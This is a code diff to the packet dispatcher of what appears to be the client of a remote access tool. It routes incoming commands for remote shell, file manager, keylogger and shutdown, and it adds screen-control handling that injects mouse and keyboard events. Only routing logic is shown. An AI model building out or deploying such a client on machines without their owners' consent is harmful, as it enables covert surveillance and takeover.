@@ -12,12 +12,16 @@ namespace Client.Networking
         private readonly Action<SystemInfoRequest> _onSystemInfoRequest;
         private readonly Action<RemoteShellRequest> _onRemoteShellRequest;
         private readonly Action<FileManagerRequest> _onFileManagerRequest;
-        private readonly Action<TaskManagerRequest> _onTaskManagerRequest;
+        private readonly Action<TaskManagerRequest>? _onTaskManagerRequest;
         private readonly Action<KeyLoggerStart>? _onKeyLoggerStart;
         private readonly Action<KeyLoggerStop>? _onKeyLoggerStop;
         private readonly Action<KeyLoggerLangToggle>? _onKeyLoggerLangToggle;
         private readonly Action<MessageBoxRequest> _onMessageBoxRequest;
         private readonly Action<ShutdownActionRequest> _onShutdownActionRequest;
+        private readonly Action<ScreenControlStart>? _onScreenControlStart;
+        private readonly Action<ScreenControlStop>? _onScreenControlStop;
+        private readonly Action<ScreenControlMouseEvent>? _onScreenControlMouseEvent;
+        private readonly Action<ScreenControlKeyboardEvent>? _onScreenControlKeyboardEvent;
 
         public PacketHandler(Action<SystemInfoRequest> onSystemInfoRequest, 
                              Action<RemoteShellRequest> onRemoteShellRequest, 
@@ -27,17 +31,25 @@ namespace Client.Networking
                              Action<KeyLoggerStart>? onKeyLoggerStart = null, 
                              Action<KeyLoggerStop>? onKeyLoggerStop = null, 
                              Action<KeyLoggerLangToggle>? onKeyLoggerLangToggle = null, 
-                             Action<TaskManagerRequest> onTaskManagerRequest)
+                             Action<TaskManagerRequest>? onTaskManagerRequest = null,
+                             Action<ScreenControlStart>? onScreenControlStart = null,
+                             Action<ScreenControlStop>? onScreenControlStop = null,
+                             Action<ScreenControlMouseEvent>? onScreenControlMouseEvent = null,
+                             Action<ScreenControlKeyboardEvent>? onScreenControlKeyboardEvent = null)
         {
             _onSystemInfoRequest = onSystemInfoRequest;
             _onRemoteShellRequest = onRemoteShellRequest;
             _onFileManagerRequest = onFileManagerRequest;
-			      _onTaskManagerRequest = onTaskManagerRequest;
+            _onTaskManagerRequest = onTaskManagerRequest;
             _onKeyLoggerStart = onKeyLoggerStart;
             _onKeyLoggerStop = onKeyLoggerStop;
             _onKeyLoggerLangToggle = onKeyLoggerLangToggle;
             _onMessageBoxRequest = onMessageBoxRequest;
             _onShutdownActionRequest = onShutdownActionRequest;
+            _onScreenControlStart = onScreenControlStart;
+            _onScreenControlStop = onScreenControlStop;
+            _onScreenControlMouseEvent = onScreenControlMouseEvent;
+            _onScreenControlKeyboardEvent = onScreenControlKeyboardEvent;
         }
 
         public void HandleLine(string json)
@@ -82,7 +94,7 @@ namespace Client.Networking
                     
                     case PacketType.TaskManagerRequest:
                         var taskReq = JsonHelper.Deserialize<TaskManagerRequest>(json);
-                        if (taskReq != null)
+                        if (taskReq != null && _onTaskManagerRequest != null)
                         {
                             _onTaskManagerRequest(taskReq);
                         }
@@ -117,6 +129,39 @@ namespace Client.Networking
                             _onShutdownActionRequest(sdReq);
                         }
                         break;
+                    
+                    case PacketType.ScreenControlStart:
+                        var screenStart = JsonHelper.Deserialize<ScreenControlStart>(json);
+                        if (screenStart != null && _onScreenControlStart != null)
+                        {
+                            _onScreenControlStart(screenStart);
+                        }
+                        break;
+                    
+                    case PacketType.ScreenControlStop:
+                        var screenStop = JsonHelper.Deserialize<ScreenControlStop>(json);
+                        if (screenStop != null && _onScreenControlStop != null)
+                        {
+                            _onScreenControlStop(screenStop);
+                        }
+                        break;
+                    
+                    case PacketType.ScreenControlMouseEvent:
+                        var mouseEvent = JsonHelper.Deserialize<ScreenControlMouseEvent>(json);
+                        if (mouseEvent != null && _onScreenControlMouseEvent != null)
+                        {
+                            _onScreenControlMouseEvent(mouseEvent);
+                        }
+                        break;
+                    
+                    case PacketType.ScreenControlKeyboardEvent:
+                        var keyboardEvent = JsonHelper.Deserialize<ScreenControlKeyboardEvent>(json);
+                        if (keyboardEvent != null && _onScreenControlKeyboardEvent != null)
+                        {
+                            _onScreenControlKeyboardEvent(keyboardEvent);
+                        }
+                        break;
+                    
                     default:
                         break;
                 }
